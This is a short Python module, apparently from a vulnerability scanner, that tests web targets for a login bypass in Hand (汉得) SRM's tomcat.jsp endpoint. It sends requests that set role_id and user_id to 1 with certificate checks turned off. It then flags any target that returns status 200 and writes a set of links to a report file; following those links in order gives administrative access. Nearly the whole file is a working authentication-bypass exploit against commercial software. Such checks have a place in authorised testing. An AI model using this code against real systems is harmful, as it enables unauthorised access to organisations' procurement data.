import requests
import time

import buter
import wirtefile

filename = "./reps/汉得SRMtomcat登录绕过-"+str(time.strftime("%Y-%m-%d", time.localtime()))

poc1 = '/tomcat.jsp?dataName=role_id&dataValue=1'
poc2= '/tomcat.jsp?dataName=user_id&dataValue=1'
path = '/main.screen'
headers = {
        "User-Agent": "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.192 Mobile Safari/537.36"
    }

def hdsrmlb(url):
    try:
        rep1 = requests.get(url+poc1,headers=headers,timeout=3,verify=False)
        rep2 = requests.get(url+poc2,headers=headers,timeout=3,verify=False)

        if rep1.status_code == 200 and rep2.status_code ==200:
            print(buter.colors.GREEN+ "疑似存在汉得SRM tomcat.jsp 登录绕过,请依次点击下方三个链接继续确认 " + buter.colors.END)
            retext = f"{url}{poc1} \n \b{url}{poc2} \n \b{url}{path} \n\n"
            print(retext)
            wirtefile.writefiles(filename,retext)
        else:
            print(buter.colors.RED + f"未发现汉得SRMtomcat登录绕过 url : {url}" + buter.colors.END)
    except Exception as e :
        print(buter.colors.END+ f"ERROR : {e}"+ buter.colors.END)
